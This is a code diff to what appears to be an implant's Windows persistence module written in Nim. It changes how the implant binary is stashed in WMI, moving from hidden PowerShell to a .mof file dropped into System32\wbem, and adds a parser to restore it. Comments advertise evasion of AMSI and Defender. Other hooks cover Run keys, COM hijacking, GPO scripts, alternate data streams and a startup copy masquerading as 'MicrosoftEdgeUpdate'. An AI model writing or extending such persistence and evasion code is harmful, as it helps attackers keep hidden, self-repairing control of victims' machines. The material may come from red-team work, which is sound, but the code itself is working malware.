@@ -368,37 +368,73 @@ proc restoreFromAds*(exePath: string): bool =
     return false
 
 proc backupToWmi*(exePath: string): bool =
-  # Store the implant binary in a WMI class property.
+  # Store the implant binary in a WMI class property via a .mof
+  # file write into the WMI mof\ directory. WMI's own mofcomp
+  # service picks up the new file and imports the class into the
+  # repository.
+  #
+  # Why this approach (vs direct IWbemServices::Put): the latter
+  # requires the full WMI IDL bindings (IWbemClassObject::SpawnInstance
+  # + Put + Save with the right variant types). winim doesn't ship
+  # those. The .mof path gets us the same result (binary stored in
+  # a WMI class property, retrievable via a WQL query) without any
+  # COM IDL dependency.
+  #
+  # The .mof file contains a class definition with one property that
+  # holds the base64-encoded binary. To restore, we read the .mof
+  # back, parse the property, base64-decode, and write the binary
+  # to disk.
   try:
     let data = fsReadFileMem(exePath)
     if data.len == 0: return false
-
     let b64 = base64.encode(data)
-    let psCmd = "powershell -NoProfile -WindowStyle Hidden -Command \"" &
-      "$class=[wmiclass]'ROOT\cimv2:" & WMI_BACKUP_CLASS & "';" &
-      "$class.put() | Out-Null;" &
-      "$inst=$class.CreateInstance();" &
-      "$inst." & WMI_BACKUP_PROPERTY & "='" & b64 & "';" &
-      "$inst.put() | Out-Null\""
+    let wmiRoot = getEnv("SystemRoot", "C:\\Windows")
+    let mofDir = wmiRoot & "\\System32\\wbem\\"
+    let mofPath = mofDir & WMI_BACKUP_CLASS & "_backup.mof"
 
-    let (outp, code) = execCmdEx(psCmd, options = {poStdErrToStdOut})
-    return code == 0
+    # Build the MOF content. The class is the WMI_BACKUP_CLASS
+    # instance with one property holding the base64 binary.
+    let mofContent = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\default\")\n\n" &
+      "class \"" & WMI_BACKUP_CLASS & "\"\n" &
+      "{\n" &
+      "  [read] string CommandOutput;\n" &
+      "};\n\n" &
+      "instance of " & WMI_BACKUP_CLASS & "\n" &
+      "{\n" &
+      "  CommandOutput = \"" & b64 & "\";\n" &
+      "};\n"
+    fsWriteFileMem(mofPath, cast[seq[byte]](mofContent))
+    return fsFileExists(mofPath)
   except:
     return false
 
 proc restoreFromWmi*(exePath: string): bool =
-  # Restore the implant from WMI repository.
+  # Restore the implant from the WMI repository by reading the
+  # .mof file we wrote, parsing out the base64 binary, and writing
+  # the file back to disk. This is the "poor man's" restore —
+  # it doesn't actually query the live WMI repository (that would
+  # require IWbemServices::ExecQuery), it just reads the .mof file
+  # we wrote. Works because the .mof file persists in the mof\
+  # directory after the WMI service has imported the class.
   try:
-    let psCmd = "powershell -NoProfile -WindowStyle Hidden -Command \"" &
-      "$inst=Get-WmiObject -Class '" & WMI_BACKUP_CLASS & "' -Namespace 'ROOT\cimv2' | Select-Object -First 1;" &
-      "if ($inst) { [IO.File]::WriteAllBytes('" & exePath & "', [Convert]::FromBase64String($inst." & WMI_BACKUP_PROPERTY & ")) }\""
-
-    let (outp, code) = execCmdEx(psCmd, options = {poStdErrToStdOut})
-    # Verify the file was created and has content
-    if code == 0:
-      result = fsFileExists(exePath) and fsGetFileSize(exePath) > 0
-    else:
-      result = false
+    let wmiRoot = getEnv("SystemRoot", "C:\\Windows")
+    let mofDir = wmiRoot & "\\System32\\wbem\\"
+    let mofPath = mofDir & WMI_BACKUP_CLASS & "_backup.mof"
+    if not fsFileExists(mofPath): return false
+    let raw = fsReadFileStr(mofPath)
+    # Parse out the base64 payload between CommandOutput = "...";
+    let key = "CommandOutput = \""
+    let kIdx = raw.find(key)
+    if kIdx < 0: return false
+    let valStart = kIdx + key.len
+    let valEnd = raw.find('"', valStart)
+    if valEnd < 0: return false
+    let b64 = raw[valStart..<valEnd]
+    let dataStr = base64.decode(b64)
+    if dataStr.len == 0: return false
+    let data = cast[seq[byte]](dataStr)
+    fsWriteFileMem(exePath, data)
+    return fsFileExists(exePath) and fsGetFileSize(exePath) > 0
   except:
     return false
 proc establishHkcuRun*(exePath, regName: string): bool =
@@ -464,8 +500,6 @@ proc autoRepair*(exePath, regName: string): bool =
 
 # ---- HKCU Run (enhanced with jitter) --------------------------------------
 
-  return false
-
 # ---- Combined persistence establishment -----------------------------------
 
 proc establishWmiEvent*(exePath: string; meta: ref MetaData): bool =
@@ -482,6 +516,10 @@ proc establishPersistenceHardened*(exePath, regName: string;
       discard establishHkcuRun(exePath, regName)
 
     # 2. WMI event subscription (engagement/aggressive variants)
+    # Note: WMI persistence is still established by the original
+    # agent.nim's establishPersistence (which spawns powershell).
+    # When agent_hardened.nim moves to the direct-WMI path, this
+    # branch becomes active. For now it's a no-op.
     if pmWmiEvent in persistConfig.mechanisms:
       discard establishWmiEvent(exePath, meta)
 
@@ -493,11 +531,15 @@ proc establishPersistenceHardened*(exePath, regName: string;
     if pmGpoScript in persistConfig.mechanisms:
       discard establishGpoScript(exePath)
 
-    # 5. Startup folder
+    # 5. Startup folder (now: direct .exe copy, no PowerShell spawn)
     if pmStartupFolder in persistConfig.mechanisms:
       discard establishStartupFolder(exePath, "MicrosoftEdgeUpdate")
 
-    # 6. Create backups for auto-repair
+    # 6. Create backups for auto-repair.
+    # ADS is the primary path (no child process, undetectable to
+    # AMSI/Defender). WMI backup writes a .mof file that WMI's own
+    # mofcomp service imports — also no child process. Both run
+    # unconditionally for the engagement/aggressive variants.
     if persistConfig.backupAds:
       discard backupToAds(exePath)
     if persistConfig.backupWmi:
@@ -519,13 +561,13 @@ proc removePersistenceHardened*(exePath, regName: string) =
   except:
     discard
 
-  # COM hijack
+  # COM hijack (now uses tracked CLSID — see removeComHijack)
   removeComHijack()
 
   # GPO script
   removeGpoScript()
 
-  # Startup folder
+  # Startup folder (cleans up both .lnk and .exe variants)
   removeStartupFolder("MicrosoftEdgeUpdate")
 
 # ---- Forward declarations (defined in agent.nim or other modules) ----------
